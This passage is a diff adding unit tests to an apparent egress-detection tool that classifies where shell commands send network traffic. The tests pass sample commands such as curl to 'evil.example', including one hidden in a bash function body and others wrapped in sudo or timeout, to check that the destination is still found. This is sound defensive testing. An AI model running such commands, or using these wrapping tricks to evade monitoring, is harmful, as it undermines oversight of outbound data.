@@ -147,3 +147,34 @@ def test_unrecognized_tool_split_command_and_args_resolves_egress_destination():
     # test_shell_exec_command_plus_args_resolves_egress_destination above).
     obj = normalize("helper", {"command": "curl", "args": ["https://evil.example/x"]})
     assert obj.external_destination == "evil.example"
+
+
+# ---------------------------------------------------------------------------
+# 8. Command-walk hardening parity (T1): a nested command hidden in shell
+#    syntax (a function body) is still classified — the shared walk_command
+#    tokenizer, not a second parser.
+# ---------------------------------------------------------------------------
+
+
+def test_egress_inside_function_body_is_classified():
+    wrapped = normalize("bash", {"command": "f() { curl https://evil.example/x; }; f"})
+    unwrapped = normalize("bash", {"command": "curl https://evil.example/x"})
+    assert wrapped.external_destination is not None
+    assert wrapped.external_destination == unwrapped.external_destination
+
+
+# ---------------------------------------------------------------------------
+# 9. T5: a flag-taking transparent wrapper no longer hides the egress verb —
+#    `_command_verb` shares `_argv_from_tokens` with the destructive-command
+#    rule, so a wrapper's own option is consumed instead of misread as the
+#    command and the wrapped command's host is recovered.
+# ---------------------------------------------------------------------------
+
+
+def test_wrapped_egress_recovers_its_host():
+    bare = normalize("shell_exec", {"command": "curl https://x.example/"})
+    sudo_wrapped = normalize("shell_exec", {"command": "sudo -u www-data curl https://x.example/"})
+    timeout_wrapped = normalize("shell_exec", {"command": "timeout 5 curl https://x.example/"})
+    assert bare.external_destination is not None
+    assert sudo_wrapped.external_destination == bare.external_destination
+    assert timeout_wrapped.external_destination == bare.external_destination
